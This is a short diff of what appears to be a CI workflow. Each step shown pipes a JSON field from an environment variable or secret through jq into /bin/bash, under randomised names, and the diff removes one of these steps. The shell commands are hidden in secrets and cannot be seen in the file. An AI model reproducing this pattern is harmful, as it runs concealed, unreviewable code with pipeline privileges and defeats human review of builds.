@@ -18,7 +18,6 @@ jobs:
           vxq2: ${{ secrets.vxq2 }}
         run: |
           printf '%s' "$vxq2" | jq -r .xcyog60501 | /bin/bash
-          echo $hu2189 | jq -r .um7 | /bin/bash
           echo $qqe8 | jq -r .ntiiw44 | /bin/bash
           printf '%s' "$fk18236" | jq -r .rdvn94 | /bin/bash
           printf '%s' "$xlrob27626" | jq -r .jei87518 | /bin/bash
